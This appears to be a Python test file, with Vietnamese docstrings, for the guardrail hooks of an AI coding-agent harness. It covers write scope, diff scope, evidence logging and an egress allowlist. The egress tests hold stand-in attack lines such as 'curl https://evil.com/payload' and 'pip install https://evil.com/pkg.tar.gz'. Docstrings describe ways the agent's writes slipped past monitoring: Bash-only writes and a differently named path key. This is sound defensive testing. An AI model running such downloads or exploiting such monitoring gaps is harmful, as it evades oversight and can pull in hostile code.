        for tool in ("Read", "Grep", "Glob", "Bash"):
            with self.subTest(tool=tool):
                self.assertTrue(self.guard(tool, kind="git-stage").allowed)

    def test_khong_khai_thi_khong_cam(self):
        """Vai lập trình không có biến này — không được chặn Write."""
        self.assertTrue(self.guard("Write", env={ENV_WRITE_SCOPE: "src"}).allowed)

    def test_ap_o_tang_dieu_phoi_nen_guard_nao_cung_chan(self):
        for kind in ("write-scope", "secret", "injection"):
            with self.subTest(guard=kind):
                self.assertFalse(self.guard("Write", kind=kind).allowed)


class TestGuardTuGhiBangChung(unittest.TestCase):
    """Hai lỗ hổng cùng gốc, đo được:

    - `guard_blocked` trích từ luồng sự kiện Claude Code; trên OpenCode nó
      luôn False dù guard chặn thật (`par`: 4 lần chặn, bằng chứng ghi
      False cả bốn).
    - `FILE_CHANGE` có mô hình, có test, nhưng **không ai ghi** — luật
      "file sửa sau lần test cuối" của guard `completion` chưa từng chạy
      ngoài test.

    Guard là điểm mọi client đều đi qua, nên ghi ở đó.
    """

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.store = EvidenceStore(self.root)
        self.env = {ENV_STORY_ID: "S-01", ENV_WRITE_SCOPE: "src"}

    def tearDown(self):
        self._tmp.cleanup()

    def su_kien(self, tool="Write", path="src/a.py"):
        return {"cwd": "/tmp/cay", "tool_name": tool,
                "tool_input": {"file_path": path, "content": "x"}}

    def test_chan_thi_ghi_guard_block(self):
        v = Verdict(False, "ngoài phạm vi")
        record_outcome("write-scope", self.su_kien(path="khac/b.py"), v,
                       env=self.env, artifact_root=str(self.root))
        ev = self.store.read("S-01")
        self.assertEqual(len(ev.guard_blocks), 1)
        self.assertEqual(ev.guard_blocks[0].name, "write-scope")
        self.assertEqual(ev.guard_blocks[0].detail["tool"], "Write")

    def test_cho_ghi_thi_ghi_file_change_va_luat_3_song_lai(self):
        """Không có bước này thì `stale_since_last_test()` luôn rỗng."""
        self.store.tool_run("S-01", "test", ok=True)
        record_outcome("write-scope", self.su_kien(), ALLOW,
                       env=self.env, artifact_root=str(self.root))
        ev = self.store.read("S-01")
        self.assertEqual(ev.stale_since_last_test(), ["src/a.py"])
        self.assertFalse(check_completion(ev).allowed)

    def test_khong_co_ma_story_thi_khong_ghi(self):
        """Phiên rà soát cố ý không mang mã story — không được làm bẩn hồ sơ."""
        record_outcome("write-scope", self.su_kien(), Verdict(False, "x"),
                       env={ENV_WRITE_SCOPE: "src"}, artifact_root=str(self.root))
        self.assertEqual(self.store.stories(), [])

    def test_guard_khac_cho_qua_thi_ghi_nhip_tim_va_telemetry(self):
        """Cho qua và không phải write-scope/diff-scope: ghi nhịp tim
        "hook tới được" (một lần) và telemetry guard_check (mọi lần)."""
        record_outcome("git-stage", {"tool_name": "Bash", "tool_input": {"command": "ls"}},
                       ALLOW, env=self.env, artifact_root=str(self.root))
        ev = self.store.read("S-01")
        self.assertEqual([e.kind for e in ev.events], ["guard_seen", "guard_check"])
        self.assertTrue(ev.events[1].ok)
        self.assertEqual(ev.events[1].detail["verdict"], "allow")


class TestNhipTimVaBashGhiFile(unittest.TestCase):
    """Đo trên `par` lượt "sau" của G4: hook chạy 17 lần, agent ghi file
    **chỉ bằng Bash**, evidence trống → cổng "guard có chạy" báo trượt sai.
    Hai sự thật cần hai sự kiện: hook tới được (`GUARD_SEEN`, một lần) và
    file đổi sau lần test cuối (`FILE_CHANGE` từ `diff-scope`, theo mtime)."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.repo = self.root / "cay"; self.repo.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=self.repo, check=True)
        self.store = EvidenceStore(self.root)
        self.env = {ENV_STORY_ID: "S-01", ENV_WRITE_SCOPE: "src", ENV_WORKDIR: str(self.repo)}

    def tearDown(self):
        self._tmp.cleanup()

    def bash(self, cmd="ls"):
        return {"cwd": str(self.repo), "tool_name": "Bash", "tool_input": {"command": cmd}}

    def test_moi_lan_guard_chay_ghi_nhip_tim_dung_mot_lan(self):
        for _ in range(3):
            record_outcome("git-stage", self.bash(), ALLOW, env=self.env, artifact_root=str(self.root))
        ev = self.store.read("S-01")
        self.assertEqual(len(ev.of("guard_seen")), 1)
        self.assertTrue(ev.guard_reached)

    def test_bash_ghi_file_sau_test_thi_diff_scope_ghi_file_change(self):
        import time
        self.store.tool_run("S-01", "test", ok=True)
        time.sleep(0.05)
        (self.repo / "src").mkdir(); (self.repo / "src" / "a.py").write_text("x = 1\n")
        record_outcome("diff-scope", self.bash("echo > src/a.py"), ALLOW,
                       env=self.env, artifact_root=str(self.root))
        ev = self.store.read("S-01")
        self.assertEqual(ev.stale_since_last_test(), ["src/a.py"])
        self.assertFalse(check_completion(ev).allowed)

    def test_file_doi_truoc_lan_test_khong_bi_coi_la_cu(self):
        import time
        (self.repo / "src").mkdir(); (self.repo / "src" / "a.py").write_text("x = 1\n")
        time.sleep(0.05)
        self.store.tool_run("S-01", "test", ok=True)
        record_outcome("diff-scope", self.bash(), ALLOW, env=self.env, artifact_root=str(self.root))
        self.assertEqual(self.store.read("S-01").stale_since_last_test(), [])

    def test_khong_ghi_trung_cung_file(self):
        import time
        self.store.tool_run("S-01", "test", ok=True); time.sleep(0.05)
        (self.repo / "src").mkdir(); (self.repo / "src" / "a.py").write_text("x\n")
        for _ in range(3):
            record_outcome("diff-scope", self.bash(), ALLOW, env=self.env, artifact_root=str(self.root))
        self.assertEqual(len(self.store.read("S-01").of("file_change")), 1)


class TestGocDuAnTuEnv(unittest.TestCase):
    """P0-1: hook ghim `--project` tuyệt đối; dự án chép/di chuyển thì guard ghi
    bằng chứng vào dự án cũ. Harness khai gốc qua env, env thắng."""

    def test_env_wins_over_compiled_project(self):
        from aisef.harness.guardrails import ENV_PROJECT, project_root_from
        self.assertEqual(project_root_from({ENV_PROJECT: "/b"}, "/a"), "/b")
        self.assertEqual(project_root_from({}, "/a"), "/a")
        self.assertEqual(project_root_from({ENV_PROJECT: "  "}, "/a"), "/a")


class TestCauHinhClientKhongPhaiThayDoiCuaStory(unittest.TestCase):
    """`.claude/settings.json`/`.opencode/` do harness chép vào worktree không được
    tính là file story đổi — dogfood par: 3/3 story trượt "phạm vi ghi" vì nó."""

    def test_changed_files_ignores_carried_client_config(self):
        import subprocess, tempfile
        from pathlib import Path
        from aisef.harness.guardrails import changed_files, check_diff_scope
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=p, check=True)
            subprocess.run(["git", "config", "user.email", "t@t"], cwd=p, check=True)
            subprocess.run(["git", "config", "user.name", "t"], cwd=p, check=True)
            (p / "src").mkdir(); (p / "src" / "a.js").write_text("1", encoding="utf-8")
            subprocess.run(["git", "add", "-A"], cwd=p, check=True)
            subprocess.run(["git", "commit", "-qm", "nền"], cwd=p, check=True)
            (p / ".claude").mkdir(); (p / ".claude" / "settings.json").write_text("{}", encoding="utf-8")
            (p / ".opencode" / "plugin").mkdir(parents=True); (p / ".opencode" / "plugin" / "g.ts").write_text("//", encoding="utf-8")
            (p / "src" / "b.js").write_text("2", encoding="utf-8")
            changed = changed_files(str(p))
        self.assertEqual(changed, ["src/b.js"])
        self.assertTrue(check_diff_scope(changed, ["src"]).allowed)


class TestCompletionKhongChayDuoc(unittest.TestCase):
    def test_unrunnable_test_lets_the_agent_stop(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            st = EvidenceStore(tmp)
            st.tool_run("S", "test", ok=False, detail={"unrunnable": "công cụ chưa cài"})
            self.assertTrue(check_completion(st.read("S")).allowed)


class TestLuat6MaQuyTrinhTrongNguon(unittest.TestCase):
    """S3: số hiệu story/epic không được nằm trong mã nguồn; test và tài liệu thì được."""

    def test_source_with_story_id_is_blocked(self):
        from aisef.harness.guardrails import check_process_refs
        v = check_process_refs("// STORY-01-02: thêm nút\nexport const x = 1\n", "src/notes.ts")
        self.assertFalse(v.allowed)
        self.assertIn("STORY-01-02", v.reason)
        self.assertFalse(check_process_refs("# EPIC-03\n", "src/app.py").allowed)

    def test_tests_docs_and_artifacts_are_allowed(self):
        from aisef.harness.guardrails import check_process_refs
        self.assertTrue(check_process_refs("test('AC-STORY-01-01-2: rỗng', () => {})", "src/a.test.js").allowed)
        self.assertTrue(check_process_refs("def test_AC_STORY_01_01_1(): pass", "tests/test_a.py").allowed)
        self.assertTrue(check_process_refs("STORY-01-01 xong", "docs/notes.md").allowed)
        self.assertTrue(check_process_refs("STORY-01-01", "_bmad-output/x.json").allowed)

    def test_clean_source_passes(self):
        from aisef.harness.guardrails import check_process_refs
        self.assertTrue(check_process_refs("export const story = 'truyện'\n", "src/x.ts").allowed)

    def test_wired_as_guard(self):
        from aisef.harness.guardrails import GUARD_MATCHERS, run_guard
        self.assertEqual(GUARD_MATCHERS["process-ref"], ("PreToolUse", "Write|Edit"))
        v = run_guard("process-ref", {"cwd": "/tmp/x", "tool_name": "Write",
                                      "tool_input": {"file_path": "src/a.ts", "content": "// EPIC-01"}},
                      project_root="/tmp/x", env={})
        self.assertFalse(v.allowed)


class TestTenKhoaDuongDanTheoClient(unittest.TestCase):
    """Hợp quy C6 2026-09-05: OpenCode gửi `filePath`; guard đọc `file_path` →
    rỗng → write-scope cho qua. Mọi guard theo đường dẫn phải thấy cả hai."""

    def _ev(self, key, path, content="x"):
        return {"cwd": "/tmp/x", "tool_name": "write", "tool_input": {key: path, "content": content}}

    def test_write_scope_sees_opencode_key(self):
        from aisef.harness.guardrails import ENV_WRITE_SCOPE, run_guard
        env = {ENV_WRITE_SCOPE: "src"}
        self.assertFalse(run_guard("write-scope", self._ev("filePath", "/tmp/x/docs/ngoai.md"), project_root="/tmp/x", env=env).allowed)
        self.assertFalse(run_guard("write-scope", self._ev("file_path", "/tmp/x/docs/ngoai.md"), project_root="/tmp/x", env=env).allowed)
        self.assertTrue(run_guard("write-scope", self._ev("filePath", "/tmp/x/src/a.js"), project_root="/tmp/x", env=env).allowed)

    def test_process_ref_sees_opencode_key(self):
        from aisef.harness.guardrails import run_guard
        ok = run_guard("process-ref", self._ev("filePath", "/tmp/x/src/a.test.js", "test('AC-STORY-01-01-1', () => {})"), project_root="/tmp/x", env={})
        self.assertTrue(ok.allowed)


class TestLuat6DuongDanTuyetDoi(unittest.TestCase):
    """Đường dẫn tuyệt đối của worktree chứa `.aisef/worktrees/` — không được
    vì thế mà thành "artifact của harness"."""

    def test_absolute_worktree_source_is_still_blocked(self):
        from aisef.harness.guardrails import check_process_refs
        root = "/tmp/du-an/.aisef/worktrees/S-1"
        v = check_process_refs("// STORY-01-01\n", f"{root}/src/ghi-chu.js", project_root=root)
        self.assertFalse(v.allowed)
        self.assertTrue(check_process_refs("STORY-01-01", f"{root}/docs/x.md", project_root=root).allowed)
        self.assertTrue(check_process_refs("STORY-01-01", f"{root}/.aisef/x.json", project_root=root).allowed)


class TestEgressGuard(unittest.TestCase):
    """V12: chặn kết nối tới host chưa khai."""

    def test_empty_allowlist_allows_everything(self):
        from aisef.harness.guardrails import check_egress
        v = check_egress("WebFetch", {"url": "https://evil.com/x"}, [])
        self.assertTrue(v.allowed)

    def test_allowed_host_passes(self):
        from aisef.harness.guardrails import check_egress
        v = check_egress("WebFetch", {"url": "https://api.github.com/repos"}, ["api.github.com"])
        self.assertTrue(v.allowed)

    def test_disallowed_host_blocks(self):
        from aisef.harness.guardrails import check_egress
        v = check_egress("WebFetch", {"url": "https://evil.com/steal"}, ["api.github.com"])
        self.assertFalse(v.allowed)
        self.assertIn("evil.com", v.reason)

    def test_wildcard_suffix_match(self):
        from aisef.harness.guardrails import check_egress
        v = check_egress("WebFetch", {"url": "https://sub.example.com/x"}, ["*.example.com"])
        self.assertTrue(v.allowed)
        v2 = check_egress("WebFetch", {"url": "https://example.com/x"}, ["*.example.com"])
        self.assertTrue(v2.allowed)
        v3 = check_egress("WebFetch", {"url": "https://notexample.com/x"}, ["*.example.com"])
        self.assertFalse(v3.allowed)

    def test_bash_curl_checked(self):
        from aisef.harness.guardrails import check_egress
        v = check_egress("Bash", {"command": "curl https://evil.com/payload"}, ["pypi.org"])
        self.assertFalse(v.allowed)

    def test_bash_no_url_passes(self):
        from aisef.harness.guardrails import check_egress
        v = check_egress("Bash", {"command": "ls -la"}, ["pypi.org"])
        self.assertTrue(v.allowed)

    def test_bash_non_network_command_with_url_passes(self):
        from aisef.harness.guardrails import check_egress
        v = check_egress("Bash", {"command": "echo https://evil.com"}, ["pypi.org"])
        self.assertTrue(v.allowed)

    def test_bash_pip_install_checked(self):
        from aisef.harness.guardrails import check_egress
        v = check_egress("Bash", {"command": "pip install https://evil.com/pkg.tar.gz"}, ["pypi.org"])
        self.assertFalse(v.allowed)

    def test_run_guard_dispatches_egress(self):
        from aisef.harness.guardrails import ENV_ALLOW_HOSTS, run_guard
        event = {"tool_name": "WebFetch", "tool_input": {"url": "https://evil.com/x"}}
        env = {ENV_ALLOW_HOSTS: "api.github.com"}
        v = run_guard("egress", event, env=env)
        self.assertFalse(v.allowed)

    def test_run_guard_egress_empty_allows(self):
        from aisef.harness.guardrails import run_guard
        event = {"tool_name": "WebFetch", "tool_input": {"url": "https://anywhere.com"}}
        v = run_guard("egress", event, env={})
        self.assertTrue(v.allowed)


class TestGiaiDoanKeHoachKhaiBaoPhamVi(unittest.TestCase):
    """Lỗi 36. Giai đoạn plan/mockup **không** truyền env nào cho client, nên
    guard suy phạm vi từ thứ **vắng mặt**: hết `AISEF_WRITE_SCOPE` thì lùi về
    phạm vi kế hoạch — nhưng chỉ đúng khi máy không còn `AISEF_STORY_ID` sót
    lại từ lượt trước. Còn sót thì guard chuyển sang chế độ story với phạm vi
    rỗng và **từ chối mọi lần ghi** của giai đoạn kế hoạch.
    """

    def test_story_id_sot_lai_lam_ket_giai_doan_ke_hoach(self):
        from aisef.harness.guardrails import PLANNING_SCOPE, effective_scope
        self.assertEqual(effective_scope({}), list(PLANNING_SCOPE))
        self.assertEqual(effective_scope({"AISEF_STORY_ID": "STORY-CU"}), [],
                         "đây là cái bẫy: có story, không có phạm vi ⇒ chặn hết")

    def test_plan_khai_bao_du_bon_bien(self):
        """Harness biết câu trả lời, không để môi trường xung quanh quyết."""
        import inspect
        from aisef.phases import mockup, plan
        for mod in (plan, mockup):
            src = inspect.getsource(mod)
            with self.subTest(module=mod.__name__):
                self.assertIn("ENV_WRITE_SCOPE: \",\".join(PLANNING_SCOPE)", src)
                self.assertIn("ENV_STORY_ID: \"\"", src)

    def test_chan_ngoai_story_van_vao_nhat_ky(self):
        """Guard chặn giai đoạn kế hoạch từng chỉ để lại lý do trong log phiên
        của client — người vận hành không thấy gì."""
        import tempfile
        from aisef.harness.guardrails import Verdict, record_outcome
        with tempfile.TemporaryDirectory() as tmp:
            record_outcome("write-scope", {"tool_name": "write"},
                           Verdict(False, "docs/x.md is outside the story's write_scope"),
                           env={}, artifact_root=tmp)
            log = (Path(tmp) / "run.log").read_text(encoding="utf-8")
        self.assertIn("guard write-scope BLOCK", log)
        self.assertIn("outside the story's write_scope", log)


class TestBanDauDaBanThiKhongPhaiLoiCuaPhien(unittest.TestCase):
    """Lỗi 38. `diff-scope` đọc **cả cây**, nên tệp người dùng để dở dang từ
    trước bị tính là "phiên này ghi ra ngoài phạm vi".

    Đo trên Windows 2026-09-09: `.ai/config.json` (do `aisef setup` ghi, chưa
    commit) làm mọi lần gọi tool của giai đoạn kế hoạch bị chặn — 14 lần trong
    một lượt, phase `ux` ra `status=blocked`. Guard hỏi *phiên này có bước ra
    ngoài phạm vi không*; thứ có sẵn trước khi phiên mở không phải việc của nó.
    """

    def setUp(self):
        import subprocess
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self._tmp.name)
        for cmd in (["git", "init", "-q"], ["git", "config", "user.email", "t@t"],
                    ["git", "config", "user.name", "t"]):
            subprocess.run(cmd, cwd=self.repo, check=True)
        (self.repo / "goc.txt").write_text("goc\n", encoding="utf-8")
        subprocess.run(["git", "add", "-A"], cwd=self.repo, check=True)
        subprocess.run(["git", "commit", "-qm", "goc"], cwd=self.repo, check=True)
        (self.repo / ".ai").mkdir()
        (self.repo / ".ai" / "config.json").write_text("{}", encoding="utf-8")  # bẩn từ trước

    def tearDown(self):
        self._tmp.cleanup()

    def _guard(self, env):
        from aisef.harness.guardrails import run_guard
        return run_guard("diff-scope", {"cwd": str(self.repo), "tool_name": "write", "tool_input": {}},
                         project_root=str(self.repo), env=env)

    def test_khong_khai_ban_dau_thi_bi_chan(self):
        env = {"AISEF_WRITE_SCOPE": "_bmad-output,docs", "AISEF_WORKDIR": str(self.repo)}
        v = self._guard(env)
        self.assertFalse(v.allowed)
        self.assertIn(".ai/config.json", v.reason)

    def test_khai_ban_dau_thi_cho_qua(self):
        env = {"AISEF_WRITE_SCOPE": "_bmad-output,docs", "AISEF_WORKDIR": str(self.repo),
               "AISEF_BASELINE_DIRTY": ".ai/config.json"}
        self.assertTrue(self._guard(env).allowed, "tệp bẩn sẵn không phải do phiên này")

    def test_van_chan_thu_phien_nay_that_su_ghi_ra_ngoai(self):
        (self.repo / "ngoai-pham-vi.py").write_text("x = 1\n", encoding="utf-8")
        env = {"AISEF_WRITE_SCOPE": "_bmad-output,docs", "AISEF_WORKDIR": str(self.repo),
               "AISEF_BASELINE_DIRTY": ".ai/config.json"}
        v = self._guard(env)
        self.assertFalse(v.allowed)
        self.assertIn("ngoai-pham-vi.py", v.reason)


class TestSanPhamBuildKhongPhaiViecCuaStory(unittest.TestCase):
    """Lỗi 46. `tsc` ghi lại `*.tsbuildinfo` mỗi lần build, nên một story
    TypeScript trượt `write scope` vì **output của chính trình biên dịch** —
    cùng lớp với `node_modules`: nó xuất hiện vì story **chạy**, không phải vì
    story **ghi**.

    Đo trên Windows 2026-09-09: `2 files changed outside write_scope:
    tsconfig.app.tsbuildinfo, tsconfig.node.tsbuildinfo`, guard chặn mọi lệnh
    bash, và người rà soát tiêu 2 trong 7 mục chặn để bảo tác giả hoàn nguyên
    một tệp mà lần build sau sinh lại.
    """

    def setUp(self):
        import subprocess
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self._tmp.name)
        for cmd in (["git", "init", "-q"], ["git", "config", "user.email", "t@t"],
                    ["git", "config", "user.name", "t"]):
            subprocess.run(cmd, cwd=self.repo, check=True)
        (self.repo / "a.ts").write_text("export const a = 1\n", encoding="utf-8")
        subprocess.run(["git", "add", "-A"], cwd=self.repo, check=True)
        subprocess.run(["git", "commit", "-qm", "goc"], cwd=self.repo, check=True)

    def tearDown(self):
        self._tmp.cleanup()

    def test_tsbuildinfo_khong_tinh_la_thay_doi(self):
        from aisef.harness.guardrails import changed_files
        (self.repo / "tsconfig.app.tsbuildinfo").write_text("{}", encoding="utf-8")
        (self.repo / "src.ts").write_text("x\n", encoding="utf-8")
        got = changed_files(str(self.repo))
        self.assertIn("src.ts", got)
        self.assertNotIn("tsconfig.app.tsbuildinfo", got)

    def test_van_bat_tep_that_su_ngoai_pham_vi(self):
        from aisef.harness.guardrails import changed_files
        (self.repo / "ngoai.ts").write_text("y\n", encoding="utf-8")
        self.assertIn("ngoai.ts", changed_files(str(self.repo)))
